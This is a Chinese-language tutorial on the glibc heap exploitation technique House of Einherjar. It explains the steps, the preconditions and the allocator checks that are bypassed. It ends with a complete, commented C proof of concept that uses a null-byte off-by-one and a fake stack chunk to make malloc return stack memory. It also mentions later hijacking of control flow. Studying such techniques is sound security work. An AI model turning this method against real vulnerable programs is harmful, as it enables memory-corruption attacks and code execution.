# 漏洞利用文档：House of Einherjar

## 攻击对象
- **主要攻击对象**：堆管理器的元数据，特别是chunk b的size字段和prev_inuse位。
- **具体内存位置**：
  - Chunk b的元数据：地址`0x603050`（基于调试记录），size字段被修改以清除PREV_INUSE位。
  - Fake chunk：位于栈上地址`0x7fffffffe2f0`（基于调试记录），通过伪造元数据（如size、fwd、bck）来欺骗堆管理器。
- **涉及结构**：堆chunk的元数据（prev_size、size、fd、bk等），用于在free和malloc操作中进行完整性检查。

## 利用过程
1. **分配chunk a**：分配一个小chunk（0x38字节），为后续off-by-one溢出提供基础。
2. **创建fake chunk**：在栈上（或其他可控地址）伪造一个chunk，设置其元数据（size、fwd、bck）以通过堆管理器的unlink检查。
3. **分配chunk b**：分配一个较大的chunk（0xf8字节），其size字段的LSB为0x00，便于off-by-one溢出修改。
4. **Off-by-one溢出**：通过chunk a的溢出，在a的末尾写入null byte，修改chunk b的size字段，清除PREV_INUSE位，表示前一个chunk为free状态。
5. **写入fake prev_size**：在chunk a的末尾写入计算好的fake prev_size值，指向fake chunk的地址，使堆管理器误以为chunk b的前一个chunk是fake chunk。
6. **修改fake chunk size**：调整fake chunk的size值，使其与fake prev_size匹配，通过`size(P) == prev_size(next_chunk(P))`检查。
7. **Free chunk b**：释放chunk b，触发堆合并操作。堆管理器基于伪造的元数据，将chunk b与fake chunk合并，形成一个大的free chunk。
8. **Malloc分配**：申请一个大chunk（0x200字节），堆管理器在合并后的fake chunk位置分配内存，实现在任意地址（如栈上）分配内存。

## 利用条件
- **Off-by-one溢出**：程序中存在一个null byte溢出漏洞，允许修改相邻chunk的元数据（如size字段的PREV_INUSE位）。
- **堆地址泄漏**：需要知道fake chunk的地址（如栈地址泄漏），以便计算fake prev_size和设置元数据。
- **可控内存写入**：能够写入伪造的元数据到特定位置（如chunk a的末尾和fake chunk）。
- **Chunk大小控制**：chunk b的size字段的LSB应为0x00，以便溢出只修改PREV_INUSE位而不改变大小。

## 利用效果
- **任意地址分配**：通过malloc在伪造的fake chunk位置（如栈上）分配内存，获得对该内存的控制权。
- **控制流劫持潜力**：如果fake chunk位于关键内存区域（如返回地址、GOT表附近），可进一步用于覆盖指针或执行代码，实现ROP或其他攻击。
- **内存破坏**：破坏堆管理器的元数据完整性，可能导致崩溃或未定义行为。

## 涉及缓解机制
House of Einherjar利用堆管理器的元数据检查漏洞，特别是free操作时的合并检查。Glibc中的相关检查包括：
- **unlink宏**：在合并chunk时，会检查chunk的双向链表完整性。伪代码如下（基于Glibc源码）：
  ```c
  #define unlink(AV, P, BK, FD) { \
      FD = P->fd; \
      BK = P->bk; \
      if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) \
          malloc_printerr ("corrupted double-linked list"); \
      // ... 其他操作 \
  }
  ```
- **size与prev_size匹配检查**：在free时，会检查当前chunk的size是否与下一个chunk的prev_size匹配（`chunksize(P) == prev_size (next_chunk(P))`）。如果伪造的fake chunk的size与fake prev_size不匹配，检查会失败。
- **PREV_INUSE位检查**：free操作会检查前一个chunk的inuse位，如果未设置，则尝试合并。

在House of Einherjar中，通过设置fake chunk的fwd和bck指向自身，并通过调整size值，绕过这些检查。

## Proof of Concept
以下是漏洞利用原型的源码，添加了关键步骤的中文注释：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("Welcome to House of Einherjar!\n");
	printf("Tested in Ubuntu 16.04 64bit.\n");
	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* d;

	printf("\nWe allocate 0x38 bytes for 'a'\n");
	a = (uint8_t*) malloc(0x38);
	printf("a: %p\n", a);
	
	int real_a_size = malloc_usable_size(a);
	printf("Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\n", real_a_size);

	// 创建fake chunk在栈上，用于欺骗堆管理器
	printf("\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\n");
	printf("However, you can also create the chunk in the heap or the bss, as long as you know its address\n");
	printf("We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n");
	printf("(although we could do the unsafe unlink technique here in some scenarios)\n");

	size_t fake_chunk[6];

	fake_chunk[0] = 0x100; // prev_size字段，需要与fake chunk的size匹配以通过检查
	fake_chunk[1] = 0x100; // size字段，需要足够小以保持在small bin中
	fake_chunk[2] = (size_t) fake_chunk; // fwd指针，指向自身以通过unlink检查
	fake_chunk[3] = (size_t) fake_chunk; // bck指针，指向自身以通过unlink检查
	fake_chunk[4] = (size_t) fake_chunk; // fwd_nextsize（对于large bin）
	fake_chunk[5] = (size_t) fake_chunk; // bck_nextsize（对于large bin）

	printf("Our fake chunk at %p looks like:\n", fake_chunk);
	printf("prev_size (not used): %#lx\n", fake_chunk[0]);
	printf("size: %#lx\n", fake_chunk[1]);
	printf("fwd: %#lx\n", fake_chunk[2]);
	printf("bck: %#lx\n", fake_chunk[3]);
	printf("fwd_nextsize: %#lx\n", fake_chunk[4]);
	printf("bck_nextsize: %#lx\n", fake_chunk[5]);

	/* 分配chunk b，其size字段的LSB为0x00，便于溢出修改 */
	b = (uint8_t*) malloc(0xf8);
	int real_b_size = malloc_usable_size(b);

	printf("\nWe allocate 0xf8 bytes for 'b'.\n");
	printf("b: %p\n", b);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
	printf("\nb.size: %#lx\n", *b_size_ptr);
	printf("b.size is: (0x100) | prev_inuse = 0x101\n");
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	a[real_a_size] = 0;  // Off-by-one溢出：写入null byte，修改chunk b的size，清除PREV_INUSE位
	printf("b.size: %#lx\n", *b_size_ptr);
	printf("This is easiest if b.size is a multiple of 0x100 so you "
		   "don't change the size of b, only its prev_inuse bit\n");
	printf("If it had been modified, we would need a fake chunk inside "
		   "b where it will try to consolidate the next chunk\n");

	// 在chunk a的末尾写入fake prev_size，指向fake chunk
	printf("\nWe write a fake prev_size to the last %lu bytes of a so that "
		   "it will consolidate with our fake chunk\n", sizeof(size_t));
	size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); // 计算fake prev_size：b的元数据起始地址减去fake chunk地址
	printf("Our fake prev_size will be %p - %p = %#lx\n", b-sizeof(size_t)*2, fake_chunk, fake_size);
	*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;  // 写入fake prev_size到chunk a的末尾

	// 修改fake chunk的size以匹配fake prev_size，通过size检查
	printf("\nModify fake chunk's size to reflect b's new prev_size\n");
	fake_chunk[1] = fake_size;

	// 释放chunk b，触发合并操作
	printf("Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
	free(b);  // Free操作：堆管理器基于伪造的元数据，将b与fake chunk合并
	printf("Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);

	// 分配大chunk，将在fake chunk位置返回内存
	printf("\nNow we can call malloc() and it will begin in our fake chunk\n");
	d = malloc(0x200);  // Malloc分配：在fake chunk地址处分配内存，实现任意地址分配
	printf("Next malloc(0x200) is at %p\n", d);
}
```

### 关键注释说明：
- **Off-by-one溢出**：`a[real_a_size] = 0;` 行写入null byte，修改chunk b的size字段，清除PREV_INUSE位。
- **Fake prev_size写入**：`*(size_t*)&a[real_a_size-sizeof(size_t)] = fake_size;` 行写入计算好的fake prev_size，使堆管理器误以为前一个chunk在fake chunk位置。
- **Fake chunk修改**：`fake_chunk[1] = fake_size;` 行调整fake chunk的size，以通过堆管理器的size匹配检查。
- **Free和malloc**：`free(b);` 和 `d = malloc(0x200);` 行触发利用，最终在栈上分配内存。

此PoC演示了如何利用off-by-one溢出和伪造元数据，实现在任意地址分配内存。